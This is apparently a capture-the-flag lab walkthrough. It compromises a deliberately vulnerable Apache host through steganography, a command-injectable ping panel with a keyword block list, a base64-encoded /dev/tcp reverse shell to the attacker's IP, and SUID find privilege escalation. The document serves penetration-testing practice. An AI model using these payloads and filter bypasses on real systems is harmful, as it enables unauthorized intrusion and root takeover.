First we start with an namp scan 

`nmap -sC -sV -T4 -Pn <IP>`

```
# Nmap 7.92 scan initiated Thu Oct 13 23:48:03 2022 as: nmap -sC -sV -T4 -oN quickmap.txt -Pn 192.168.95.15
Nmap scan report for 192.168.95.15
Host is up (0.15s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 13 23:48:29 2022 -- 1 IP address (1 host up) scanned in 26.33 seconds
```

we have only http port open, ran a full port scan also it is the only port open. so let's enumerate. Open the IP on our browser.

![image](https://user-images.githubusercontent.com/87468669/195765478-4c145921-0438-4e14-877b-82aaadb3e840.png)

we have the default page running and it clams to be a fak admin area, tried playing around, nothing worked so let's view source page.

![image](https://user-images.githubusercontent.com/87468669/195765693-0ada8744-351d-4db9-83e8-567008168795.png)

The source page is empty, Let's burst hidden directory.

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/PG/Noname]
└─$ ffuf -u "http://192.168.95.15/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .txt,.php,.bak,.sh,.sql -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.95.15/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .txt .php .bak .sh .sql 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

admin                   [Status: 200, Size: 417, Words: 18, Lines: 61, Duration: 242ms]
index.php               [Status: 200, Size: 201, Words: 13, Lines: 8, Duration: 164ms]
index.php               [Status: 200, Size: 201, Words: 13, Lines: 8, Duration: 161ms]
:: Progress: [28278/28278] :: Job [1/1] :: 183 req/sec :: Duration: [0:02:22] :: Errors: 0 ::
```

great we got hidden directories, let's check the admin directory 

![image](https://user-images.githubusercontent.com/87468669/195766380-8d36de52-ee66-4a95-a2f8-05a15b8fc942.png)

we got some pictures, let's check the page source.

![image](https://user-images.githubusercontent.com/87468669/195766532-c1b361f0-7dad-43ec-80d2-7313d0ee785a.png)

In the bottom part of the page there is a passphrase: "harder".This might be a stego password, so let's download all the images on the webpage.

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/PG/Noname]
└─$ wget http://192.168.95.15/new.jpg                                                                                
--2022-10-14 00:09:52--  http://192.168.95.15/new.jpg
Connecting to 192.168.95.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3919716 (3.7M) [image/jpeg]
Saving to: ‘new.jpg’

new.jpg                                   100%[===================================================================================>]   3.74M   937KB/s    in 4.4s    

2022-10-14 00:09:56 (870 KB/s) - ‘new.jpg’ saved [3919716/3919716]

                                                                                                                                                                      
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/PG/Noname]
└─$ wget http://192.168.95.15/ctf-01.jpg
--2022-10-14 00:10:04--  http://192.168.95.15/ctf-01.jpg
Connecting to 192.168.95.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1303340 (1.2M) [image/jpeg]
Saving to: ‘ctf-01.jpg’

ctf-01.jpg                                100%[===================================================================================>]   1.24M   402KB/s    in 3.2s    

2022-10-14 00:10:07 (402 KB/s) - ‘ctf-01.jpg’ saved [1303340/1303340]


┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/PG/Noname]
└─$ wget http://192.168.95.15/haclabs.jpeg
--2022-10-14 00:10:44--  http://192.168.95.15/haclabs.jpeg
Connecting to 192.168.95.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10486 (10K) [image/jpeg]
Saving to: ‘haclabs.jpeg’

haclabs.jpeg                              100%[===================================================================================>]  10.24K  --.-KB/s    in 0.007s  

2022-10-14 00:10:45 (1.36 MB/s) - ‘haclabs.jpeg’ saved [10486/10486]


┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/PG/Noname]
└─$ wget http://192.168.95.15/Short.png   
--2022-10-14 00:11:11--  http://192.168.95.15/Short.png
Connecting to 192.168.95.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1019381 (995K) [image/png]
Saving to: ‘Short.png’

Short.png                                 100%[===================================================================================>] 995.49K   392KB/s    in 2.5s    

2022-10-14 00:11:14 (392 KB/s) - ‘Short.png’ saved [1019381/1019381]
                                                              
```

Now we have downloaded all the images in the webpage, let's use steghide to extract hidden contents.

![image](https://user-images.githubusercontent.com/87468669/195767542-b063bc85-14b4-4893-be84-b96206a720a3.png)

command used `steghide extract -sf haclabs.jpeg` using the passphrase: "harder", we got the hidden file "imp.txt" that is in the image. Let's check the content of imp.txt.

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/PG/Noname]
└─$ cat imp.txt      
c3VwZXJhZG1pbi5waHA=
                                                                                                                                                                      
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/PG/Noname]
└─$ echo "c3VwZXJhZG1pbi5waHA=" | base64 -d                
superadmin.php                                                                                                                                             
```

The content of imp.txt was a base64 encoding and it was dcoded to `superadmin.php` now let's check this on the page.

![image](https://user-images.githubusercontent.com/87468669/195768149-de9b5a79-9613-4836-9a75-dc76156b207f.png)

nice we got a ping command panel, let's try ping 127.0.0.1.

![image](https://user-images.githubusercontent.com/87468669/195768265-470e3f2a-d5aa-4d32-881c-ca5a6ee052c7.png)

we got a response, let's test for command injection.

![image](https://user-images.githubusercontent.com/87468669/195768438-de374946-ae1a-4157-996d-88837e89a12a.png)

we have command injection. let's try inject a revserse shell. tried differnt reverse shell payload none worked, let's check the source code for the superadmin.php to see what is happening. `127.0.0.1 | cat superadmin.php`

![image](https://user-images.githubusercontent.com/87468669/195769280-abd7f23a-1626-47fe-8782-6d36ef10690b.png)

source code:

```
<?php
   if (isset($_POST['submitt']))
{
   	$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");
   	$pinged=$_POST['pinger'];
   	$newStr = str_replace($word, "", $pinged);
   	if(strcmp($pinged, $newStr) == 0)
		{
		    $flag=1;
		}
       else
		{
		   $flag=0;
		}
}

if ($flag==1){
$outer=shell_exec("ping -c 3 $pinged");
echo "<pre>$outer</pre>";
}
?>
```

some commands are blocked, let's try encode our payload in base64 to bypass restrictions.

reverse shell `sh -i >& /dev/tcp/192.168.49.95/1337 0>&1`

encoded payload

![image](https://user-images.githubusercontent.com/87468669/195770516-02254b69-699a-4351-b628-f736e9c702e0.png)

reverse shell payload 

```
127.0.0.1 | echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40OS45NS8xMzM3IDA+JjE= | base64 -d | bash
```

ncat listener ready

![image](https://user-images.githubusercontent.com/87468669/195769640-b4f23cb7-33cc-46c4-8f8e-c7a3b0ccb15a.png)

inject our payload 

![image](https://user-images.githubusercontent.com/87468669/195770811-468cd858-27ce-474c-aa7c-b8bcc945482e.png)

check oue ncat listener we got a shell

![image](https://user-images.githubusercontent.com/87468669/195770955-cc4f1193-782c-4944-a399-15995cac6f2c.png)

Let's stabilize the shell

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/PG/Noname]
└─$ nc -lnvp 1337                                      
listening on [any] 1337 ...
connect to [192.168.49.95] from (UNKNOWN) [192.168.95.15] 37608
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@haclabs:/var/www/html$ ^Z
zsh: suspended  nc -lnvp 1337
                                                                                                                                                                      
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/PG/Noname]
└─$ stty raw -echo;fg                
[1]  + continued  nc -lnvp 1337
                               export TERM=xterm
www-data@haclabs:/var/www/html$ 
www-data@haclabs:/var/www/html$ 

```

![image](https://user-images.githubusercontent.com/87468669/195771191-58aca499-91c7-4897-8372-5e03e2cb908f.png)

We have a stable shell, let's escalate privs to root. First let's check for suid using command `find / -perm -u=s -type f 2>/dev/null`

```
www-data@haclabs:/var/www/html$ find / -perm -u=s -type f 2>/dev/null                                                                                                 
/usr/lib/snapd/snap-confine                                                                                                                                 
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper 
/usr/lib/policykit-1/polkit-agent-helper-1 
/usr/sbin/pppd                  
/usr/bin/pkexec 
/usr/bin/find 
/usr/bin/gpasswd 
/usr/bin/chfn
/usr/bin/chsh 
/usr/bin/arping 
/usr/bin/passwd
/usr/bin/traceroute6.iputils 
/usr/bin/sudo
/usr/bin/newgrp
/snap/core/8689/bin/mount 
/snap/core/8689/bin/ping
/snap/core/8689/bin/ping6 
/snap/core/8689/bin/su  
/snap/core/8689/bin/umount  
/snap/core/8689/usr/bin/chfn 
/snap/core/8689/usr/bin/chsh   
/snap/core/8689/usr/bin/gpasswd  
/snap/core/8689/usr/bin/newgrp  
/snap/core/8689/usr/bin/passwd  
/snap/core/8689/usr/bin/sudo 
/snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core/8689/usr/lib/openssh/ssh-keysign 
/snap/core/8689/usr/lib/snapd/snap-confine 
/snap/core/8689/usr/sbin/pppd
/snap/core/9436/bin/mount
```

![image](https://user-images.githubusercontent.com/87468669/195772368-48958c06-b1fe-4d01-8631-803b050c4a93.png)

we have an SUID `/usr/bin/find` let's abuse the bin and get root. From gtfobins we can see the payload to use in abusing the bin.

![image](https://user-images.githubusercontent.com/87468669/195772606-9696048f-d01a-455b-95d6-d6a5947a5a8d.png)

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

![image](https://user-images.githubusercontent.com/87468669/195772861-5ab06ee1-26c1-4b01-b300-6ee02f14c8c7.png)

We are root!. hope you had fun😉.
